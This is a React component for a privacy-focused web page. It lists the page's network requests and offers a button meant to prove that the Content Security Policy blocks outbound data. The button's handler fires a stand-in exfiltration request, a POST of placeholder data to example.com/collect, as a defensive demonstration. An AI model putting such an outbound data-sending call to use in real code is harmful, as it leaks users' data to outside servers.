"use client";

import { useRef, useState } from "react";
import { Button, Plate, ScrollArea, StatusLine, cn } from "@toolwright/ui";
import { NetworkLedger } from "../network-ledger";
import { useOutsideRequests } from "../../lib/use-outside-requests";

type Attempt = { state: "idle" } | { state: "trying" } | { state: "blocked"; directive: string | null } | { state: "sent" };

const kb = (bytes: number) => (bytes ? `${(bytes / 1024).toFixed(bytes < 10240 ? 1 : 0)} KB` : "cached");

/**
 * "Check it yourself": the page's real network log (from Resource Timing), plus a button that tries to send data
 * to another server so you can watch the browser refuse. The refusal comes from the Content Security Policy, not from us.
 */
export function ProofLog() {
  const { log } = useOutsideRequests();
  const [attempt, setAttempt] = useState<Attempt>({ state: "idle" });
  const directive = useRef<string | null>(null);

  async function tryToLeak() {
    directive.current = null;
    setAttempt({ state: "trying" });
    const onViolation = (e: SecurityPolicyViolationEvent) => {
      directive.current = e.violatedDirective;
    };
    document.addEventListener("securitypolicyviolation", onViolation);
    try {
      await fetch("https://example.com/collect", { method: "POST", body: "this-would-be-your-data", mode: "no-cors" });
      setAttempt({ state: "sent" });
    } catch {
      // The violation event fires slightly after the rejection.
      await new Promise((r) => setTimeout(r, 50));
      setAttempt({ state: "blocked", directive: directive.current });
    } finally {
      document.removeEventListener("securitypolicyviolation", onViolation);
    }
  }

  const rows = log.slice(-14);

  return (
    <Plate
      label="Request log · this page"
      footer={
        <StatusLine>
          <NetworkLedger link={false} showSameOrigin />
        </StatusLine>
      }
      padded={false}
    >
      <ScrollArea label="Requests made by this page" className="max-h-72">
        <table className="w-full min-w-[30rem] border-collapse text-left font-mono text-xs">
          <thead className="sticky top-0 bg-muted text-muted-foreground">
            <tr>
              <th className="px-4 py-2 font-medium uppercase tracking-wider">Kind</th>
              <th className="px-2 py-2 font-medium uppercase tracking-wider">Path</th>
              <th className="px-2 py-2 text-right font-medium uppercase tracking-wider">Size</th>
              <th className="px-4 py-2 text-right font-medium uppercase tracking-wider">From</th>
            </tr>
          </thead>
          <tbody>
            {rows.length === 0 ? (
              <tr>
                <td colSpan={4} className="px-4 py-6 text-muted-foreground">
                  Waiting for the browser to report requests…
                </td>
              </tr>
            ) : null}
            {rows.map((r, i) => {
              let path = r.url;
              try {
                const u = new URL(r.url);
                path = r.outside ? u.host + u.pathname : u.pathname + u.search;
              } catch {
                /* keep the raw string */
              }
              return (
                <tr key={`${r.url}-${i}`} className="border-t border-border">
                  <td className="px-4 py-1.5 text-muted-foreground">{r.type}</td>
                  <td className="max-w-[16rem] truncate px-2 py-1.5" title={r.url}>
                    {path}
                  </td>
                  <td className="px-2 py-1.5 text-right tabular-nums text-muted-foreground">{kb(r.size)}</td>
                  <td className={cn("px-4 py-1.5 text-right font-semibold uppercase tracking-wider", r.outside ? "text-danger" : "text-primary")}>{r.outside ? "outside" : "this site"}</td>
                </tr>
              );
            })}
          </tbody>
        </table>
      </ScrollArea>

      <div className="flex flex-col gap-3 border-t border-border p-4 sm:p-5">
        <div className="flex flex-wrap items-center gap-3">
          <Button variant="primary" onClick={tryToLeak} disabled={attempt.state === "trying"}>
            {attempt.state === "trying" ? "Trying…" : "Try to make it leak"}
          </Button>
          <span className="text-sm text-muted-foreground">Sends a test message to another server, right now.</span>
        </div>
        <div aria-live="polite" role="status">
          {attempt.state === "blocked" ? (
            <p className="border border-l-4 border-border border-l-success bg-card px-4 py-3 text-sm">
              <strong>Blocked.</strong> The browser refused to send it
              {attempt.directive ? (
                <>
                  : the Content Security Policy directive <code className="font-mono text-[13px]">{attempt.directive}</code> only allows this site.
                </>
              ) : (
                "."
              )}{" "}
              Nothing left your device.
            </p>
          ) : null}
          {attempt.state === "sent" ? (
            <p role="alert" className="border border-l-4 border-border border-l-danger bg-card px-4 py-3 text-sm">
              <strong>That request was sent.</strong> The policy should have blocked it. Please{" "}
              <a className="underline" href="/privacy">
                report this
              </a>
              .
            </p>
          ) : null}
        </div>
      </div>
    </Plate>
  );
}
